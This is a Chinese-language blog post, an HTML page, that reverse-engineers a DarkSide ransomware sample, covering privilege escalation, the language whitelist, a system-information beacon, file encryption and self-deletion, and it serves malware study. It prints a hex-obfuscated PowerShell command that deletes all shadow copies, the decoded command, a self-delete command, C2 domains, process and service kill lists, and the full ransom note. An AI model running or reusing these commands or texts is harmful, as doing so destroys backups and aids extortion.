<!DOCTYPE html>
<html lang="zh-cn">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<meta name="theme-color" content="#494f5c">
	<meta name="msapplication-TileColor" content="#494f5c">
<meta itemprop="name" content="DarksideRansomware">
<meta itemprop="description" content="DarksideRansomware样本分析 样本信息 本次分析的样本来源于MALWAREbazaar。具体的SHA、MD5如下： SHA256 hash:151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5 SHA1 hash:eeb28144f39b275ee1ec008859e80f215710dc57 MD5 hash:9d418ecc0f3bf45029263b0944236884 本"><meta itemprop="datePublished" content="2021-05-25T10:56:10&#43;08:00" />
<meta itemprop="dateModified" content="2021-05-25T10:56:10&#43;08:00" />
<meta itemprop="wordCount" content="3029"><meta itemprop="image" content="https://www.a1ee.cn/bg.png">
<meta itemprop="keywords" content="DarksideRansomware,Sample," /><meta property="og:title" content="DarksideRansomware" />
<meta property="og:description" content="DarksideRansomware样本分析 样本信息 本次分析的样本来源于MALWAREbazaar。具体的SHA、MD5如下： SHA256 hash:151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5 SHA1 hash:eeb28144f39b275ee1ec008859e80f215710dc57 MD5 hash:9d418ecc0f3bf45029263b0944236884 本" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.a1ee.cn/medium/darksideransomware/" /><meta property="og:image" content="https://www.a1ee.cn/bg.png" /><meta property="article:section" content="medium" />
<meta property="article:published_time" content="2021-05-25T10:56:10&#43;08:00" />
<meta property="article:modified_time" content="2021-05-25T10:56:10&#43;08:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://www.a1ee.cn/bg.png"/>

<meta name="twitter:title" content="DarksideRansomware"/>
<meta name="twitter:description" content="DarksideRansomware样本分析 样本信息 本次分析的样本来源于MALWAREbazaar。具体的SHA、MD5如下： SHA256 hash:151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5 SHA1 hash:eeb28144f39b275ee1ec008859e80f215710dc57 MD5 hash:9d418ecc0f3bf45029263b0944236884 本"/>

	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
	<link rel="manifest" href="/site.webmanifest">
	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
	<link rel="shortcut icon" href="/favicon.ico">

	<title>DarksideRansomware</title>
	<link rel="stylesheet" href="https://www.a1ee.cn/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css" integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin="anonymous">
	<style>.bg-img {background-image: url('https://www.a1ee.cn/bg.png');}</style>
</head>

<body id="page">
	
	<header id="site-header" class="animated slideInUp">
		<div class="hdr-wrapper section-inner">
			<div class="hdr-left">
				<div class="site-branding">
					<a href="https://www.a1ee.cn">alee</a>
				</div>
				<nav class="site-nav hide-in-mobile">
					
				<a href="https://www.a1ee.cn/basic/">BASIC</a>
				<a href="https://www.a1ee.cn/simaple/">SIMAPLE</a>
				<a href="https://www.a1ee.cn/medium/">MEDIUM</a>
				<a href="https://www.a1ee.cn/about-me/">ABOUT</a>

				</nav>
			</div>
			<div class="hdr-right hdr-icons">
				<button id="img-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-image"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg></button><span class="hdr-social hide-in-mobile"><a href="https://github.com/a1eex0" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
			</div>
		</div>
	</header>
	<div id="mobile-menu" class="animated fast">
		<ul>
			<li><a href="https://www.a1ee.cn/basic/">BASIC</a></li>
			<li><a href="https://www.a1ee.cn/simaple/">SIMAPLE</a></li>
			<li><a href="https://www.a1ee.cn/medium/">MEDIUM</a></li>
			<li><a href="https://www.a1ee.cn/about-me/">ABOUT</a></li>
		</ul>
	</div>


	<div class="bg-img"></div>
	<main class="site-main section-inner animated fadeIn faster">
		<article class="thin">
			<header class="post-header">
				<div class="post-meta"><span>May 25, 2021</span></div>
				<h1>DarksideRansomware</h1>
			</header>
			<div class="content">
				<h1 id="darksideransomware样本分析">DarksideRansomware样本分析<a href="#darksideransomware样本分析" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
<h2 id="样本信息">样本信息<a href="#样本信息" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<p>本次分析的样本来源于<a href="https://bazaar.abuse.ch/sample/151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5/">MALWAREbazaar</a>。具体的SHA、MD5如下：</p>
<pre><code>SHA256 hash:151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5
SHA1 hash:eeb28144f39b275ee1ec008859e80f215710dc57
MD5 hash:9d418ecc0f3bf45029263b0944236884
</code></pre><p>本次分析的环境是：<code>windows 7 ultimate sp1 x64</code></p>
<h2 id="样本分析">样本分析<a href="#样本分析" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<h3 id="去除重定位">去除重定位<a href="#去除重定位" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<p>因为是在win7上做调试，使用LordPE关闭程序的重定位（为了方便写注释），由于该样本逻辑并不复杂，所以也可以不做这一步。</p>
<p><img src="/darkside_images/3185806156853.png" alt=""></p>
<p>（注：为方便区分，关闭重定向后的样本名为：Darkside.exe）</p>
<h3 id="普通用户权限运行样本">普通用户权限运行样本<a href="#普通用户权限运行样本" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<p>从函数功能及运行流程可以得出：当样本感染了一台主机后，会动态加载自身所需的dll，接着释放使用的字符串，然后判断当前执行权限是否是admin权限，如果不是，则进行提权，然后用管理员权限重载自身。</p>
<p><img src="/darkside_images/3132437176854.png" alt=""></p>
<h4 id="加载dll函数">加载dll函数<a href="#加载dll函数" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>dll的加载又解密函数解密dll名称，再使用<code>loardlibrary</code>加载。解密函数核心流程如下：</p>
<p><img src="/darkside_images/3880452197020.png" alt=""></p>
<p>最后解出来的dll名称为：</p>
<pre><code>ntdll,kernel32,advapi32,shell32,ole32,oleaut32,mpr,iphlpapi,shlwapi,gdi32,user32,netapi32,wsock32,wininet,wtsapi32
</code></pre><h4 id="字符串解析">字符串解析<a href="#字符串解析" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>以下就是字符串解析的核心算法：</p>
<p><img src="/darkside_images/5527236106855.png" alt=""></p>
<p>当解密函数运行结束，可以看到以下调用关系：</p>
<p><img src="/darkside_images/1727847127021.png" alt=""></p>
<p>手动导出字符串，内容如下：</p>
<pre><code>$recycle.bin，config.msi，$windows.~bt，$windows.~ws，windows，appdata，application data，boot，google，mozilla，program files，program files (x86)，programdata，system volume information，tor browser，windows.old，intel，msocache，perflogs，x64dbg，public，all users，default

autorun.inf，boot.ini，bootfont.bin，bootsect.bak，desktop.ini，iconcache.db，ntldr，ntuser.dat，ntuser.dat.log，ntuser.ini，thumbs.db

386，adv，ani，bat，bin，cab，cmd，com，cpl，cur，deskthemepack，diagcab，diagcfg，diagpkg，dll，drv，exe，hlp，icl，icns，ico，ics，idx，ldf，lnk，mod，mpa，msc，msp，msstyles，msu，nls，nomedia，ocx，prf，ps1，rom，rtp，scr，shs，spl，sys，theme，themepack，wpx，lock，key，hta，msi，pdb

backup

sql，sqlite

vmcompute.exe，vmms.exe，vmwp.exe，svchost.exe，TeamViewer.exe，explorer.exe

sql，oracle，ocssd，dbsnmp，synctime，agntsvc，isqlplussvc，xfssvccon，mydesktopservice，ocautoupds，encsvc，firefox，tbirdconfig，mydesktopqos，ocomm，dbeng50，sqbcoreservice，excel，infopath，msaccess，mspub，onenote，outlook，powerpnt，steam，thebat，thunderbird，visio，winword，wordpad，notepad

vss，sql，svc$，memtas，mepocs，sophos，veeam，backup，GxVss，GxBlr，GxFWD，GxCVD，GxCIMgr

securebestapp20.com，temisleyes.com

All of your files are encrypted! Find %s and Follow Instructions!

----------- [ Welcome to DarkSide ] -------------&gt;

What happend?
----------------------------------------------
Your computers and servers are encrypted, backups are deleted. We use strong encryption algorithms, so you cannot decrypt your data. .. But you can restore everything by purchasing a special program from us - universal decryptor. This program will restore all your network
Follow our instructions below and you will recover all your data.

What guarantees?
----------------------------------------------
We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests.
All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems.
We guarantee to decrypt one file for free. Go to the site and contact us.

How to get access on website?
----------------------------------------------
Using a TOR browser:
1) Download and install TOR browser from this site: https://torproject.org/
2) Open our website: http://darksidfqzcuhtk2.onion/CZEX8E0GR0AO4ASUCJE1K824OKJA1G24B8B3G0P84LJTTE7W8EC86JBE7NBXLMRT

When you open our website, put the following data in the input form:
Key
:0kZdK3HQhsAkUtvRl41QkOdpJvzcWnCrBjjgg5U4zfuWeTnZR5Ssjd3QLHpmbjxjo7uWzKbt8qPVuYN38TsDPI3bemd5I40ksemIzuI5OhIHZsi9cn3Wpd7OUT72FP9MyAUzR586yMsI2Ygri9in0Bf4EkG0pmBOLyRG1T788foGJQW1WxS1Qd2sMVvX0jKlbGG1zLp7g0u6buDCzSMyTjWjuVzJYufBBv7S2XvciEVvboiTNbZA4UUU6PttKERQSb018aILd6xO3ulk6fbEgZDO5tZSGn2zRevn5YXnHtg6vt1ToLe3izQOgYbs8Ja1fkfJBUYVux1ITyWBjpn0xPayKfwln8SqgMkbqiDyxEDEtFhqiffLcONMhi4TmW50loZIC6mWSaOjThWp6XSJUWPtY8Mkzs8Cs0qjPahx58iAEVIRGUVpLkMs7xPN7ydZ6wMWaOcRC1AD1JEUVTjLikXXyckgYaS6FnEv0UNEsv6QbTLSpDomIg3rEYZBib6ozrwH5n0M5wrKo8NciUBmfJWDP4XKkjznpsa05rEpuAklM0dMmZsYGVR

!!! DANGER !!!
DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them.
!!! DANGER !!!
</code></pre><h4 id="访问令牌读取函数">访问令牌读取函数<a href="#访问令牌读取函数" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>进入函数内部，根据api调用情况可以看到该函数结构简单：</p>
<p><img src="/darkside_images/2427851119690.png" alt=""></p>
<p>这里有两个判断较为重要</p>
<pre><code>cmp dword ptr ds:[eax+0x8], 0x20
cmp dword ptr ds:[eax+0xC], 0x220
</code></pre><p>在微软官方的<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids">安全标识符说明</a>中可以找到sid的值为32和544的角色权限分别如下：</p>
<p><img src="/darkside_images/5706513170561.png" alt=""></p>
<p><img src="/darkside_images/5203714188987.png" alt=""></p>
<p>如果没有这两个权限，那么将不会进行uac提权。</p>
<h4 id="提权和重载自身函数">提权和重载自身函数<a href="#提权和重载自身函数" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>该部分均为api调用，较为简单明了。</p>
<p><img src="/darkside_images/2970710126245.png" alt=""></p>
<h3 id="管理员权限运行样本">管理员权限运行样本<a href="#管理员权限运行样本" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<p>当样本获得了管理员权限，那么自然是要进行加密操作了，在此之前，它将会通过crc32计算后缀名用于图标生成和加密文件字符串添加；检索本地语言；发送信息至服务器；删除本地卷影；检索本地磁盘空闲空间；加密所有文件；自我删除。</p>
<h4 id="后缀名生成函数">后缀名生成函数<a href="#后缀名生成函数" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>该函数主要是<code>crc32计算</code>。图标的名字来源于uuid，通过了4次crc32计算</p>
<p><img src="/darkside_images/5111541121999.png" alt=""></p>
<p>crc32计算函数如下：</p>
<p><img src="/darkside_images/4693844139879.png" alt=""></p>
<h4 id="本地语言判断函数">本地语言判断函数<a href="#本地语言判断函数" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>样本会获取本地<code>默认ui语言</code>和<code>区域格式语言</code>，如果是<code>白名单</code>内的语言，则退出，不是则进行下一步。语言判断函数部分核心如下：</p>
<p><img src="/darkside_images/1011651136226.png" alt=""></p>
<p>从<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lcid/70feba9f-294e-491e-b6eb-56532684c37f">Windows语言代码标识符（LCID）参考</a>中得知，本地语言所有判断如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">序号</th>
<th style="text-align:center">语言代码（hex）</th>
<th style="text-align:center">标识符</th>
<th style="text-align:center">语种</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">419</td>
<td style="text-align:center">ru-RU</td>
<td style="text-align:center">俄语</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">422</td>
<td style="text-align:center">uk-UA</td>
<td style="text-align:center">乌克兰语</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">423</td>
<td style="text-align:center">be-BY</td>
<td style="text-align:center">白俄罗斯语</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">428</td>
<td style="text-align:center">tg-Cyrl-TJ</td>
<td style="text-align:center">塔吉克语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">42B</td>
<td style="text-align:center">hy-AM</td>
<td style="text-align:center">亚美尼亚语</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">42C</td>
<td style="text-align:center">az-Latn-AZ</td>
<td style="text-align:center">阿塞拜疆语（拉丁语）</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">437</td>
<td style="text-align:center">ka-GE</td>
<td style="text-align:center">格鲁吉亚语</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">43F</td>
<td style="text-align:center">kk-KZ</td>
<td style="text-align:center">哈萨克语</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">440</td>
<td style="text-align:center">ky-KG</td>
<td style="text-align:center">吉尔吉斯语</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">442</td>
<td style="text-align:center">tk-TM</td>
<td style="text-align:center">土库曼语（拉丁语）</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">443</td>
<td style="text-align:center">uz-Latn-UZ</td>
<td style="text-align:center">乌兹别克语（拉丁语）</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">444</td>
<td style="text-align:center">tt-RU</td>
<td style="text-align:center">塔塔尔语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">818</td>
<td style="text-align:center">ro-MD</td>
<td style="text-align:center">罗马尼亚语（摩尔多瓦）</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">819</td>
<td style="text-align:center">ru-MD</td>
<td style="text-align:center">俄语（摩尔多瓦）</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td style="text-align:center">82C</td>
<td style="text-align:center">az-Cyrl-AZ</td>
<td style="text-align:center">阿塞拜疆语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td style="text-align:center">843</td>
<td style="text-align:center">uz-Cyrl-UZ</td>
<td style="text-align:center">乌兹别克语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td style="text-align:center">2801</td>
<td style="text-align:center">ar-SY</td>
<td style="text-align:center">阿拉伯语（叙利亚）</td>
</tr>
</tbody>
</table>
<h4 id="发送信息至服务器函数">发送信息至服务器函数<a href="#发送信息至服务器函数" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>将本地的系统相关信息发送到攻击者的服务器：json格式内容如下：</p>
<pre><code>{
	&quot;bot&quot;:{
	&quot;ver&quot;:&quot;1.8.6.2&quot;,
	&quot;uid&quot;:&quot;060108efb510c98&quot;
	},
	&quot;os&quot;:{
	&quot;lang&quot;:&quot;zh-CN&quot;,
	&quot;username&quot;:&quot;alee&quot;,
	&quot;hostname&quot;:&quot;WIN-B1ESUN1R9U8&quot;,
	&quot;domain&quot;:&quot;WORKGROUP&quot;,
	&quot;os_type&quot;:&quot;windows&quot;,
	&quot;os_version&quot;:&quot;Windows 7 Ultimate&quot;,
	&quot;os_arch&quot;:&quot;x64&quot;,
	&quot;disks&quot;:&quot;C:72/99&quot;,
	&quot;id&quot;:&quot;826dfd7bd5985bdbd259&quot;
	}
}
</code></pre><p>服务器为：<code>securebestapp20.com</code></p>
<h4 id="删除本地卷影">删除本地卷影<a href="#删除本地卷影" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>核心代码如下：</p>
<p><img src="/darkside_images/5604835168666.png" alt=""></p>
<p>powershell命令如下：</p>
<pre><code>40B5E2:L&quot;powershell -ep bypass -c \&quot;(0..61)|%{{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))}};iex $s\&quot;&quot;
</code></pre><p>将十六进制转换成字符串如下：</p>
<pre><code>Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
</code></pre><h4 id="检索本地磁盘空闲空间">检索本地磁盘空闲空间<a href="#检索本地磁盘空闲空间" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>空闲空间检索存在两个判断，但至少保证有100mb才会进行下一步。</p>
<p><img src="/darkside_images/192720173802.png" alt=""></p>
<h4 id="加密所有文件">加密所有文件<a href="#加密所有文件" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>从动态调试中可以找到加密主函数的地址，在ida中呈现如下：</p>
<p><img src="/darkside_images/1604535140565.png" alt=""></p>
<p>进入其中可发现流程如下：</p>
<p><img src="/darkside_images/4085142188991.png" alt=""></p>
<p>进入加密流程可以看到：会检索文件结构，然后递归对文件进行加密。</p>
<p><img src="/darkside_images/2721245176858.png" alt=""></p>
<p>深入到加密操作中，发现会首先进行是否加密判断，未加密则重命名：</p>
<p><img src="/darkside_images/3495450197024.png" alt=""></p>
<p>对文件内容进行rsa1028加密，并生成加密文件：</p>
<p><img src="/darkside_images/2789151189693.png" alt=""></p>
<h4 id="自我删除">自我删除<a href="#自我删除" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>自我删除的主函数如下：</p>
<p><img src="/darkside_images/33802100566.png" alt=""></p>
<p>使用<code>Procmon</code>检测到的指令如下：</p>
<pre><code>&quot;C:\Windows\system32\cmd.exe&quot; /C DEL /F /Q C:\Users\alee\Desktop\DARKSI~1\Darkside.exe &gt;&gt; NUL
</code></pre><p>在命令行使用<code>cmd /?</code>可以了解到：</p>
<pre><code>/C      执行字符串指定的命令然后终止
/Q      关闭回显
/F      启用文件和目录名完成字符
</code></pre><h2 id="总结">总结<a href="#总结" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<p>这是我第二次做样本分析，其中遇到了很多问题，api的熟悉度这个是一个经验问题，另外两个问题是最为严重的：</p>
<ul>
<li>ida动态链接库的引入</li>
<li>由汇编代码判断加密方式</li>
</ul>
<p>第一个问题如果不是有现成的<code>idapython</code>脚本，那我将不可能完成本次分析，所以深入了解<code>idapython</code> 脚本的编写是很有必要的；</p>
<p>第二个问题则需要通过对更多样本的分析，或自我构建加密程序进行分析才能够弥补差距。后续将采用两种方式并进的模式进行能力增强。</p>
<p>最后本次分析参考了很多前辈分享的资料，感谢大家的无私分享。</p>
<p>参考资料：<code>https://chuongdong.com/reverse%20engineering/2021/05/06/DarksideRansomware/</code></p>

			</div>
			<hr class="post-end">
			<footer class="post-info">
				<p>
					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://www.a1ee.cn/tags/darksideransomware">DarksideRansomware</a></span><span class="tag"><a href="https://www.a1ee.cn/tags/sample">Sample</a></span>
				</p>
				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg></p>
				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-05-25 10:56 &#43;0800</p>
			</footer>
		</article>
		<div class="post-nav thin">
			<a class="next-post" href="https://www.a1ee.cn/medium/agenttesla/">
				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>&nbsp;</span><br><span>AgentTesla</span>
			</a>
			<a class="prev-post" href="https://www.a1ee.cn/medium/incaseformat/">
